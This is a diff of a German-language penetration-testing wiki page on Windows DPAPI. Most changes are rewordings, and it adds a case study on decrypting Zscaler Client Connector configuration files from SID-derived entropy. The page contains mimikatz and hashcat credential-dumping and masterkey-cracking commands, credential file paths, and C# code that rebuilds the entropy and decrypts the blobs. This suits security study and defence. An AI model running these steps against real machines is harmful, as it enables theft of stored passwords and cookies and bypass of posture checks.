@@ -6,11 +6,11 @@
 
 ## Was ist DPAPI
 
-Die Data Protection API (DPAPI) wird hauptsächlich im Windows-Betriebssystem für die **symmetrische Verschlüsselung asymmetrischer privater Schlüssel** verwendet, wobei entweder Benutzer- oder Systemgeheimnisse als bedeutende Entropiequelle dienen. Dieser Ansatz vereinfacht die Verschlüsselung für Entwickler, indem er ihnen ermöglicht, Daten mit einem Schlüssel zu verschlüsseln, der aus den Anmeldegeheimnissen des Benutzers oder, bei der Systemverschlüsselung, den Authentifizierungsgeheimnissen der Domäne des Systems abgeleitet wird, wodurch die Notwendigkeit entfällt, dass Entwickler den Schutz des Verschlüsselungsschlüssels selbst verwalten.
+Die Data Protection API (DPAPI) wird hauptsächlich im Windows-Betriebssystem für die **symmetrische Verschlüsselung asymmetrischer privater Schlüssel** verwendet, wobei entweder Benutzer- oder Systemgeheimnisse als bedeutende Entropiequelle dienen. Dieser Ansatz vereinfacht die Verschlüsselung für Entwickler, indem er ihnen ermöglicht, Daten mit einem Schlüssel zu verschlüsseln, der aus den Anmeldegeheimnissen des Benutzers oder, bei der Systemverschlüsselung, den Authentifizierungsgeheimnissen der Domäne des Systems abgeleitet wird, wodurch die Notwendigkeit entfällt, dass Entwickler den Schutz des Verschlüsselungsschlüssels selbst verwalten müssen.
 
 Die gebräuchlichste Methode zur Verwendung von DPAPI erfolgt über die **`CryptProtectData` und `CryptUnprotectData`** Funktionen, die es Anwendungen ermöglichen, Daten sicher mit der Sitzung des Prozesses zu verschlüsseln und zu entschlüsseln, der derzeit angemeldet ist. Das bedeutet, dass die verschlüsselten Daten nur von demselben Benutzer oder System entschlüsselt werden können, das sie verschlüsselt hat.
 
-Darüber hinaus akzeptieren diese Funktionen auch einen **`entropy` Parameter**, der ebenfalls während der Verschlüsselung und Entschlüsselung verwendet wird. Daher müssen Sie, um etwas zu entschlüsseln, das mit diesem Parameter verschlüsselt wurde, denselben Entropiewert angeben, der während der Verschlüsselung verwendet wurde.
+Darüber hinaus akzeptieren diese Funktionen auch einen **`entropy` Parameter**, der ebenfalls während der Verschlüsselung und Entschlüsselung verwendet wird. Daher müssen Sie, um etwas zu entschlüsseln, das mit diesem Parameter verschlüsselt wurde, den gleichen Entropiewert angeben, der während der Verschlüsselung verwendet wurde.
 
 ### Schlüsselgenerierung für Benutzer
 
@@ -41,7 +41,7 @@ Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
 Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
 Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
 ```
-Dies ist, wie eine Reihe von Master-Schlüsseln eines Benutzers aussehen wird:
+Dies ist, wie eine Reihe von Master Keys eines Benutzers aussehen wird:
 
 ![](<../../images/image (1121).png>)
 
@@ -53,7 +53,6 @@ Beachten Sie, dass diese Schlüssel **kein Domänen-Backup haben**, sodass sie n
 
 - **Mimikatz** kann darauf zugreifen, indem es LSA-Geheimnisse mit dem Befehl: `mimikatz lsadump::secrets` dumpet.
 - Das Geheimnis wird in der Registrierung gespeichert, sodass ein Administrator **die DACL-Berechtigungen ändern könnte, um darauf zuzugreifen**. Der Registrierungspfad ist: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
-
 
 ### Geschützte Daten durch DPAPI
 
@@ -93,7 +92,7 @@ mimikatz sekurlsa::dpapi
 # Mimikatz
 lsadump::secrets /system:DPAPI_SYSTEM /export
 ```
-- Wenn das Passwort oder der NTLM-Hash des Benutzers bekannt ist, kann man **die Master-Schlüssel des Benutzers direkt entschlüsseln**:
+- Wenn das Passwort oder der NTLM-Hash des Benutzers bekannt ist, können Sie **die Master-Schlüssel des Benutzers direkt entschlüsseln**:
 ```bash
 # Mimikatz
 dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected
@@ -119,14 +118,14 @@ mimikatz vault::list
 ```
 ## Zugriff auf DPAPI-verschlüsselte Daten
 
-### DPAPI-verschlüsselte Daten finden
+### Finden Sie DPAPI-verschlüsselte Daten
 
 Häufig geschützte **Dateien** von Benutzern befinden sich in:
 
 - `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
 - `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
 - `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
-- Überprüfen Sie auch, ob Sie `\Roaming\` in den obigen Pfaden in `\Local\` ändern.
+- Überprüfen Sie auch, ob Sie `\Roaming\` in den obigen Pfaden durch `\Local\` ersetzen. 
 
 Beispiele zur Enumeration:
 ```bash
@@ -253,7 +252,7 @@ Microsoft führte ein **context 3** masterkey-Format mit Windows 10 v1607 (2016)
 DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
 hashcat -m 22102 bob.hc wordlist.txt -O -w4
 ```
-Das Tool kann auch Credential- und Vault-Blobs analysieren, sie mit geknackten Schlüsseln entschlüsseln und Klartext-Passwörter exportieren.
+Das Tool kann auch Credential- und Vault-Blobs parsen, sie mit geknackten Schlüsseln entschlüsseln und Klartext-Passwörter exportieren.
 
 ### Zugriff auf Daten anderer Maschinen
 
@@ -279,11 +278,11 @@ Mit der aus der LDAP-Computerliste extrahierten Liste können Sie jedes Subnetz 
 * Parallele Sammlung von Blobs von Hunderten von Hosts
 * Parsing von **context 3** Masterkeys und automatische Hashcat-Cracking-Integration
 * Unterstützung für Chrome "App-Bound" verschlüsselte Cookies (siehe nächsten Abschnitt)
-* Ein neuer **`--snapshot`** Modus, um wiederholt Endpunkte abzufragen und neu erstellte Blobs zu vergleichen
+* Ein neuer **`--snapshot`** Modus, um Endpunkte wiederholt abzufragen und neu erstellte Blobs zu vergleichen
 
 ### DPAPISnoop
 
-[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) ist ein C#-Parser für Masterkey-/Credential-/Vault-Dateien, der Hashcat/JtR-Formate ausgeben und optional das Cracking automatisch auslösen kann. Es unterstützt vollständig die Formate von Maschinen- und Benutzer-Masterkeys bis Windows 11 24H1.
+[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) ist ein C#-Parser für Masterkey-/Credential-/Vault-Dateien, der Hashcat/JtR-Formate ausgeben und optional das Cracking automatisch auslösen kann. Es unterstützt vollständig Maschinen- und Benutzer-Masterkey-Formate bis Windows 11 24H1.
 
 
 ## Häufige Erkennungen
@@ -298,10 +297,46 @@ Mit der aus der LDAP-Computerliste extrahierten Liste können Sie jedes Subnetz 
 ### 2023-2025 Schwachstellen & Änderungen im Ökosystem
 
 * **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Ein Angreifer mit Netzwerkzugang könnte ein Domänenmitglied dazu bringen, einen bösartigen DPAPI-Backup-Schlüssel abzurufen, was die Entschlüsselung von Benutzer-Masterkeys ermöglicht. Im November 2023 in einem kumulativen Update gepatcht – Administratoren sollten sicherstellen, dass DCs und Arbeitsstationen vollständig gepatcht sind.
-* **Chrome 127 “App-Bound” Cookie-Verschlüsselung** (Juli 2024) ersetzte den veralteten DPAPI-Only-Schutz durch einen zusätzlichen Schlüssel, der im **Credential Manager** des Benutzers gespeichert ist. Die Offline-Entschlüsselung von Cookies erfordert jetzt sowohl den DPAPI-Masterkey als auch den **GCM-umwickelten app-bound key**. SharpChrome v2.3 und DonPAPI 2.x können den zusätzlichen Schlüssel wiederherstellen, wenn sie im Benutzerkontext ausgeführt werden.
+* **Chrome 127 “App-Bound” Cookie-Verschlüsselung** (Juli 2024) ersetzte den legacy DPAPI-only Schutz durch einen zusätzlichen Schlüssel, der im **Credential Manager** des Benutzers gespeichert ist. Die Offline-Entschlüsselung von Cookies erfordert jetzt sowohl den DPAPI-Masterkey als auch den **GCM-umwickelten app-bound key**. SharpChrome v2.3 und DonPAPI 2.x können den zusätzlichen Schlüssel wiederherstellen, wenn sie im Benutzerkontext ausgeführt werden.
 
 
-## Referenzen
+### Fallstudie: Zscaler Client Connector – Benutzerdefinierte Entropie, die aus SID abgeleitet ist
+
+Zscaler Client Connector speichert mehrere Konfigurationsdateien unter `C:\ProgramData\Zscaler` (z. B. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Jede Datei ist mit **DPAPI (Maschinenscope)** verschlüsselt, aber der Anbieter liefert **benutzerdefinierte Entropie**, die *zur Laufzeit berechnet* wird, anstatt auf der Festplatte gespeichert zu werden.
+
+Die Entropie wird aus zwei Elementen wiederhergestellt:
+
+1. Ein hartcodiertes Geheimnis, das in `ZSACredentialProvider.dll` eingebettet ist.
+2. Die **SID** des Windows-Kontos, zu dem die Konfiguration gehört.
+
+Der von der DLL implementierte Algorithmus entspricht:
+```csharp
+byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
+byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);
+
+// XOR the two buffers byte-by-byte
+byte[] tmp = new byte[secret.Length];
+for (int i = 0; i < secret.Length; i++)
+tmp[i] = (byte)(sid[i] ^ secret[i]);
+
+// Split in half and XOR both halves together to create the final entropy buffer
+byte[] entropy = new byte[tmp.Length / 2];
+for (int i = 0; i < entropy.Length; i++)
+entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
+```
+Weil das Geheimnis in einer DLL eingebettet ist, die vom Datenträger gelesen werden kann, **kann jeder lokale Angreifer mit SYSTEM-Rechten die Entropie für jede SID regenerieren** und die Blobs offline entschlüsseln:
+```csharp
+byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
+byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
+Console.WriteLine(Encoding.UTF8.GetString(clear));
+```
+Die Entschlüsselung ergibt die vollständige JSON-Konfiguration, einschließlich jeder **Geräte-Posture-Prüfung** und ihres erwarteten Wertes – Informationen, die sehr wertvoll sind, wenn man versucht, clientseitige Umgehungen durchzuführen.
+
+> TIP: Die anderen verschlüsselten Artefakte (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) sind mit DPAPI **ohne** Entropie (`16` Null-Bytes) geschützt. Sie können daher direkt mit `ProtectedData.Unprotect` entschlüsselt werden, sobald SYSTEM-Rechte erlangt werden.
+
+## References
+
+- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
 
 - [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
 - [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
